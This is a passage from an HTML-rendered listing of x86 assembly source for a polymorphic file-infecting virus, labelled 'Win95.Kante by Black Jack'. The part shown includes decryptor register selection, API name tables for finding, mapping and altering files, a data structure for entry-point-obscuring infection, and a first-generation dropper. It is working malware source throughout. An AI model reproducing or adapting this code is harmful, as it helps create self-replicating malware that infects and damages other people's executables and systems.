        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111b</span><span class="sc0">                            </span><span class="sc1">; between 0 and 7</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                              </span><span class="sc1">; avoid already used registers</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_SP</span><span class="sc0">                             </span><span class="sc1">; avoid ESP (stack must not</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">                         </span><span class="sc1">; me destroyed by decryptor)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_BP</span><span class="sc0">                             </span><span class="sc1">; avoid EBP (some opcodes look</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">                         </span><span class="sc1">; different for EBP)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_AX</span><span class="sc0">                             </span><span class="sc1">; avoid EAX (because of the</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">get_register</span><span class="sc0">                         </span><span class="sc1">; optimised opcodes for EAX)</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">get_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                             </span><span class="sc1">; I know, I know, this is a</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">                                     </span><span class="sc1">; privileged op-code in WinNT.</span><span class="sc0">
                                                </span><span class="sc1">; But since the virus doesn't</span><span class="sc0">
                                                </span><span class="sc1">; work there anyways, I use</span><span class="sc0">
                                                </span><span class="sc1">; it because of convenience.</span><span class="sc0">
                                                </span><span class="sc1">; so please note that this is</span><span class="sc0">
                                                </span><span class="sc1">; not the main reason for</span><span class="sc0">
                                                </span><span class="sc1">; WinNT incompatibility!</span><span class="sc0">



</span><span class="sc5">n_GetProcAddress</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">l_GetProcAddress</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">n_GetProcAddress</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">n_GlobalAlloc</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">other_API_names</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">n_SetFileAttributesA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_CreateFileA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_GetFileTime</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_SetFileTime</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_GetFileSize</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_CreateFileMappingA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_MapViewOfFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_UnmapViewOfFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_SetFilePointer</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_SetEndOfFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_CloseHandle</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_GetDriveTypeA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetDriveTypeA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_SetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_FindFirstFileA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_FindNextFileA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_FindClose</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_Sleep</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Sleep"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_ExitProcess</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ExitProcess"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">l_ExitProcess</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">n_ExitProcess</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">number_of_other_APIs</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">


</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc4">(((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; align 4</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">-((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">main_data</span><span class="sc0">       </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFileTime</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFileTime</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetDriveTypeA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Sleep</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">kernel32</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetProcAddress</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">drive</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">start_virusbody</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">poly_virus_size</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">decryptor_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">filehandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">maphandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mapbase</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">virus_offset</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">virus_RVA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">EPO_API_VA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">epo_offset</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">epo_RVA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">epo_opcode</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">jmp_displacement_ptr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">write_section_RVA_ptr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">virus_RVA_ptr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">imagebase_ptr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">FileAttributes</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                            </span><span class="sc1">; FindData structure</span><span class="sc0">
</span><span class="sc5">CreationTime</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LastAccessTime</span><span class="sc0">  </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LastWriteTime</span><span class="sc0">   </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSizeHigh</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSizeLow</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wfd_reserved</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DosFileName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">poly_virus_body</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">main_data</span><span class="sc0">       </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">first_gen_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_gen_capt</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_gen_msg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">

</span><span class="sc5">first_gen_capt</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win95.Kante by Black Jack"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">first_gen_msg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"This is a first generation virus dropper"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">first_gen_host</span><span class="sc0">
</span></div></body>
</html>
